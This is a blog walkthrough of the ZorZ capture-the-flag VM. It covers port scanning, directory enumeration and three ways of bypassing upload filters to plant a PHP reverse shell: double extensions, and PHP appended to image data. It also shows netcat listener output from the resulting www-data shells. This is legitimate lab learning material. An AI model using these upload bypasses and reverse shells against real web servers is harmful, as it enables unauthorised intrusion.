---
layout: blog_item
title: "Zorz Walkthrough"
date: "2015-07-01"
author: Arr0way
description: 'Zorz - Walkthrough Guide'
categories: [walkthroughs]
tags:
- CTF
---

<div class="coffee-rating">
<table>
      <tbody>
        <tr>
           <td>
               <p><code>Coffee Difficulty Rating:</code></p>
           </td>
           <td>
               <p><i class="fa fa-coffee"></i></p>
           </td>
        </tr>
      </tbody>
</table>
</div>

* list element with functor item
{:toc}

## Author Description

Welcome to the ZorZ VM Challenge

This machine will probably test your web app skills once again. There are 3 different pages that should be focused on (you will see!) If you solve one or all three pages, please send me an email and quick write up on how you solved each challenge. Your goal is to successfully upload a webshell or malicious file to the server. If you can execute system commands on this box, thats good enough!!! I hope you have fun!

### Port Scanning

{% highlight bash %}

nmap -v -p 1-65535 -sV -O -sT 10.0.1.110

{% endhighlight %}


### Service Enumeration

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Port</th>
      <th>Service</th>
      <th>Version Detection</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>TCP: 80</code></p></pc>
           </td>
           <td>
               <pc><p>HTTP</p></pc>
           </td>
           <td>
               <pc><p>Apache httpd 2.4.7 ((Ubuntu))</p></pc>
           </td>
        </tr>
        </tbody>

</table>
</div>

### HTTP Enumeration

Enumeration of port 80, discovered <code>login.php</code>:

![dirbuster](/img/blog/zorz/dirbuster.png)

## Level 1

The web application has no filter protection, so uploading a PHP shell is possible.

![uploader1](/img/blog/zorz/uploader1.png)

PHP Shell Upload:

![php shell upload](/img/blog/zorz/file-upload.png)

The location <code>/uploads2</code> was previously disclosed by **Dirbuster**, <code>/uploads1</code> was discovered manually (logical guess).

![php shell execution](/img/blog/zorz/uploads1.png)

Reverse shell:

{% highlight bash %}

[root:~]# nc -n -v -l -p 443                               
listening on [any] 443 ...
connect to [10.0.1.110] from (UNKNOWN) [10.0.1.111] 33115
Linux zorz 3.13.0-45-generic #74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 i686 i686 GNU/Linux
 16:21:31 up 1 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$

{% endhighlight %}

Level 1 complete.

## Level 2

The initial attempt to upload the previous shell failed with the error message:

![php shell upload fail](/img/blog/zorz/upload2-fail.png)

Several attempts were then made to upload shells with various extensions such as <code>shell.png.php</code> , <code>shell.php.png</code> etc to bypass the web application filtering, all attempts to bypassed the filtering failed.

### Burp Suite - PHP Shell Injection in an Image file

It was apparent the web application had a mechanism for image file validation, several attempts were made to inject the php shell code into the image file. The solution was to inject the code at the end of the image data.

The file extension also needed modifying to <code>.php.jpg</code>, this appeared to force the web server to process the file, likely due to poorly configured Apache MIME types.

![Burp Suite shell injection in an image](/img/blog/zorz/burp-php-shell-injection-in-an-image.png)

Image uploaded successfully.

![Shell Upload](/img/blog/zorz/uploaded-shell.png)

Execution of image from <code>/uploads2</code>

![upload dir](/img/blog/zorz/dir.png)

### Reverse Shell:

{% highlight bash %}

[root:~]# nc -n -v -l -p 443
listening on [any] 443 ...
connect to [10.0.1.110] from (UNKNOWN) [10.0.1.111] 33118
Linux zorz 3.13.0-45-generic #74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 i686 i686 GNU/Linux
 17:02:32 up 42 min,  0 users,  load average: 0.00, 0.01, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$

{% endhighlight %}

Level 2 complete.

## Level 3

Level 3 was beaten simply by renaming the php reverse shell to <code>php-reverse-shell.php.png</code>, this was enough to bypass the filtering.

![Level 3](/img/blog/zorz/level3.png)

An alternative solution would of been to use burp to upload the file + change the content type.

## Flag

{% highlight bash %}

$ cd l337saucel337
$ ls
SECRETFILE
$ cat SE
cat: SE: No such file or directory
$ cat SECRETFILE
Great job so far. This box has 3 uploaders.

The first 2 are pure php, the last one is php w/jquery.

To get credit for this challenge, please submit a write-up or instructions
on how you compromised the uploader or uploaders. If you solve 1, 2, or all
of the uploader challenges, feel free to shoot me an email and let me know!

Thanks for playing!
http://www.top-hat-sec.com
$

{% endhighlight %}

Level 3 complete.

Thanks for the VM :)
